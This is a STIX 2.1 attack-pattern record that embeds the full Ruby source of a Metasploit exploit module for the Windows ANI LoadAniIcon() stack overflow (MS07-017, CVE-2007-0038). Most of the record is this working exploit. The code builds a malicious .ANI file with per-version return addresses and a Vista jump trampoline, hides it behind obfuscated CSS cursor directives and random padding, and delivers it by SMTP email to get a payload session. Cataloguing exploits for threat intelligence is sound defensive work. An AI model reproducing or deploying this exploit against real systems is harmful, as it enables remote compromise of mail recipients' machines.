{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9eefdcc6-e92d-4dc4-97b6-39f3f9bcb34e",
    "created": "2024-08-14T16:38:57.766765Z",
    "modified": "2024-08-14T16:38:57.766769Z",
    "name": "Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)",
    "description": " This module exploits a buffer overflow vulnerability in the LoadAniIcon() function of USER32.dll. The flaw is triggered through Outlook Express by using the CURSOR style sheet directive to load a malicious .ANI file.  This vulnerability was discovered by Alexander Sotirov of Determina and was rediscovered, in the wild, by McAfee.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/email/ms07_017_ani_loadimage_chunksize.rb",
            "external_id": "ms07_017_ani_loadimage_chunksize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0038"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1765"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #\n  # This module sends email messages via smtp\n  #\n  include Msf::Exploit::Remote::SMTPDeliver\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)',\n      'Description'    => %q{\n        This module exploits a buffer overflow vulnerability in the\n        LoadAniIcon() function of USER32.dll. The flaw is triggered\n        through Outlook Express by using the CURSOR style sheet\n        directive to load a malicious .ANI file.\n\n        This vulnerability was discovered by Alexander Sotirov of Determina\n        and was rediscovered, in the wild, by McAfee.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hdm',   # First version\n          'skape', # Vista support\n        ],\n      'References'     =>\n        [\n          ['MSB', 'MS07-017'],\n          ['CVE', '2007-0038'],\n          ['CVE', '2007-1765'],\n          ['OSVDB', '33629'],\n          ['BID', '23194']\n        ],\n      'Stance'         => Msf::Exploit::Stance::Passive,\n      'DefaultOptions' =>\n        {\n          # Cause internet explorer to exit after the code hits\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'       => 1024 + (rand(1000)),\n          'MinNops'     => 32,\n          'Compat'      =>\n            {\n              'ConnectionType' => '-bind -find',\n            },\n\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n\n          #\n          # Use multiple cursor URLs to try all targets. This can result in\n          # multiple, sequential sessions\n          #\n\n          [ 'Automatic', {} ],\n\n          #\n          # The following targets use call [ebx+4], just like the original exploit\n          #\n\n          # Partial overwrite doesn't work for Outlook Express\n          [ 'Windows XP SP2 user32.dll 5.1.2600.2622', { 'Ret' => 0x25ba, 'Len' => 2 }],\n\n          # Should work for all English XP SP2\n          [ 'Windows XP SP2 userenv.dll English', { 'Ret' => 0x769fc81a }],\n\n          # Supplied by Fabrice MOURRON <fab[at]revhosts.net>\n          [ 'Windows XP SP2 userenv.dll French', { 'Ret' => 0x7699c81a }],\n\n          # Should work for English XP SP0/SP1\n          [ 'Windows XP SP0/SP1 netui2.dll English', { 'Ret' => 0x71bd0205 }],\n\n          # Should work for English 2000 SP0-SP4+\n          [ 'Windows 2000 SP0-SP4 netui2.dll English', { 'Ret' => 0x75116d88 }],\n\n          #\n          # Partial overwrite where 700b is a jmp dword [ebx] ebx points to the start\n          # of the RIFF chunk itself.  The length field of the RIFF chunk\n          # tag contains a short jump into an embedded riff chunk that\n          # makes a long relative jump into the actual payload.\n          #\n          [ 'Windows Vista user32.dll 6.0.6000.16386',\n            {\n              'Ret'         => 0x700b,\n              'Len'         => 2,\n\n              # On Vista, the pages that contain the RIFF are read-only.\n              # In-place decoders cannot be used.\n              'Payload'     => { 'EncoderType' => Msf::Encoder::Type::Raw }\n            }\n          ],\n\n          #\n          # Supplied by Ramon de C Valle\n          #\n\n          # call [ebx+4]\n          [ 'Windows XP SP2 user32.dll (5.1.2600.2180) Multi Language', { 'Ret' => 0x25d0, 'Len' => 2 }],\n          [ 'Windows XP SP2 user32.dll (5.1.2600.2180) English', { 'Ret' => 0x77d825d0 }],\n          [ 'Windows XP SP2 userenv.dll Portuguese (Brazil)', { 'Ret' => 0x769dc81a }],\n\n          # call [esi+4]\n          [ 'Windows XP SP1a userenv.dll English', { 'Ret' => 0x75a758b1 }],\n          [ 'Windows XP SP1a shell32.dll English', { 'Ret' => 0x77441a66 }]\n        ],\n      'DisclosureDate' => '2007-03-28',\n      'DefaultTarget' => 0))\n\n  end\n\n  def autofilter\n    false\n  end\n\n  def exploit\n\n    exts = ['bmp', 'wav', 'png', 'zip', 'tar']\n\n    gext =  exts[rand(exts.length)]\n    name = rand_text_alpha(rand(10)+1) + \".#{gext}\"\n\n    anis = {}\n\n    html =\n      \"<html><head><title>\" +\n        rand_text_alphanumeric(rand(128)+4) +\n      \"</title>\" +\n      \"</head><body>\" + rand_text_alphanumeric(rand(128)+1)\n\n\n    mytargs = (target.name =~ /Automatic/) ? targets : [target]\n\n    if target.name =~ /Automatic/\n      targets.each_index { |i|\n        next if not targets[i].ret\n        acid = generate_cid\n        html << generate_div(\"cid:#{acid}\")\n\n        # Re-generate the payload, using the explicit target\n        return if ((p = regenerate_payload(nil, nil, targets[i])) == nil)\n\n        # Generate an ANI file for this target\n        anis[acid] = generate_ani(p, targets[i])\n      }\n    else\n      acid = generate_cid\n      html << generate_div(\"cid:#{acid}\")\n\n      # Re-generate the payload, using the explicit target\n      return if ((p = regenerate_payload(nil, nil, target)) == nil)\n\n      # Generate an ANI file for this target\n      anis[acid] = generate_ani(p, target)\n    end\n\n    html << \"</body></html>\"\n\n\n    msg = Rex::MIME::Message.new\n    msg.mime_defaults\n    msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)\n    msg.to = datastore['MAILTO']\n    msg.from = datastore['MAILFROM']\n\n    msg.add_part(Rex::Text.encode_base64(html, \"\\r\\n\"), \"text/html\", \"base64\", \"inline\")\n    anis.each_pair do |cid,ani|\n      part = msg.add_part_attachment(ani, cid + \".\" + gext)\n      part.header.set(\"Content-ID\", \"<\"+cid+\">\")\n    end\n\n    send_message(msg.to_s)\n\n    print_status(\"Waiting for a payload session (backgrounding)...\")\n  end\n\n  def generate_cid\n    rand_text_alphanumeric(32)+'@'+rand_text_alphanumeric(8)\n  end\n\n  def generate_div(url)\n    \"<div style='\" +\n      generate_css_padding() +\n      Rex::Text.to_rand_case(\"cursor\") +\n      generate_css_padding() +\n      \":\" +\n      generate_css_padding() +\n      Rex::Text.to_rand_case(\"url(\") +\n      generate_css_padding() +\n      \"\\\"#{url}\\\"\" +\n      generate_css_padding() +\n      \");\" +\n      generate_css_padding() +\n      \"'>\" +\n      generate_padding() +\n    \"</div>\"\n  end\n\n  def generate_ani(payload, target)\n\n    # Build the first ANI header\n    anih_a = [\n      36,            # DWORD cbSizeof\n      rand(128)+16,  # DWORD cFrames\n      rand(1024)+1,  # DWORD cSteps\n      0,             # DWORD cx,cy  (reserved - 0)\n      0,             # DWORD cBitCount, cPlanes (reserved - 0)\n      0, 0, 0,       # JIF jifRate\n      1              # DWORD flags\n    ].pack('V9')\n\n    anih_b = nil\n\n    if (target.name =~ /Vista/)\n      # Vista has ebp=80, eip=84\n      anih_b = rand_text(84)\n\n      # Patch local variables and loop counters\n      anih_b[68, 12] = [0].pack(\"V\") * 3\n    else\n      # XP/2K has ebp=76 and eip=80\n      anih_b = rand_text(80)\n\n      # Patch local variables and loop counters\n      anih_b[64, 12] = [0].pack(\"V\") * 3\n    end\n\n    # Overwrite the return with address of a \"call ptr [ebx+4]\"\n    anih_b << [target.ret].pack('V')[0, target['Len'] ? target['Len'] : 4]\n\n    # Begin the ANI chunk\n    riff = \"ACON\"\n\n    # Calculate the data offset for the trampoline chunk and add\n    # the trampoline chunk if we're attacking Vista\n    if target.name =~ /Vista/\n      trampoline_doffset = riff.length + 8\n\n      riff << generate_trampoline_riff_chunk\n    end\n\n    # Insert random RIFF chunks\n    0.upto(rand(128)+16) do |i|\n      riff << generate_riff_chunk()\n    end\n\n    # Embed the first ANI header\n    riff << \"anih\" + [anih_a.length].pack('V') + anih_a\n\n    # Insert random RIFF chunks\n    0.upto(rand(128)+16) do |i|\n      riff << generate_riff_chunk()\n    end\n\n    # Trigger the return address overwrite\n    riff << \"anih\" + [anih_b.length].pack('V') + anih_b\n\n    # If this is a Vista target, then we need to align the length of the\n    # RIFF chunk so that the low order two bytes are equal to a jmp $+0x16\n    if target.name =~ /Vista/\n      plen  = (riff.length & 0xffff0000) | 0x0eeb\n      plen += 0x10000 if (plen - 8) < riff.length\n\n      riff << generate_riff_chunk((plen - 8) - riff.length)\n\n      # Replace the operand to the relative jump to point into the actual\n      # payload itself which comes after the riff chunk\n      riff[trampoline_doffset + 1, 4] = [riff.length - trampoline_doffset - 5].pack('V')\n    end\n\n    # Place the RIFF chunk in front and off we go\n    ret = \"RIFF\" + [riff.length].pack('V') + riff\n\n    # We copy the encoded payload to the stack because sometimes the RIFF\n    # image is mapped in read-only pages.  This would prevent in-place\n    # decoders from working, and we can't have that.\n    ret << Rex::Arch::X86.copy_to_stack(payload.encoded.length)\n\n    # Place the real payload right after it.\n    ret << payload.encoded\n\n    ret\n\n  end\n\n  # Generates a riff chunk with the first bytes of the data being a relative\n  # jump.  This is used to bounce to the actual payload\n  def generate_trampoline_riff_chunk\n    tag = Rex::Text.to_rand_case(rand_text_alpha(4))\n    dat = \"\\xe9\\xff\\xff\\xff\\xff\" + rand_text(1) + (rand_text(rand(256)+1) * 2)\n    tag +\t[dat.length].pack('V') + dat\n  end\n\n  def generate_riff_chunk(len = (rand(256)+1) * 2)\n    tag = Rex::Text.to_rand_case(rand_text_alpha(4))\n    dat = rand_text(len)\n    tag + [dat.length].pack('V') + dat\n  end\n\n  def generate_css_padding\n    buf =\n      generate_whitespace() +\n      \"/*\" +\n      generate_whitespace() +\n      generate_padding() +\n      generate_whitespace() +\n      \"*/\" +\n      generate_whitespace()\n  end\n\n  def generate_whitespace\n    len = rand(100)+2\n    set = \"\\x09\\x20\\x0d\\x0a\"\n    buf = ''\n\n    while (buf.length < len)\n      buf << set[rand(set.length)].chr\n    end\n    buf\n  end\n\n  def generate_padding\n    rand_text_alphanumeric(rand(128)+4)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-03-28",
    "x_mitre_platforms": [
        "win'"
    ]
}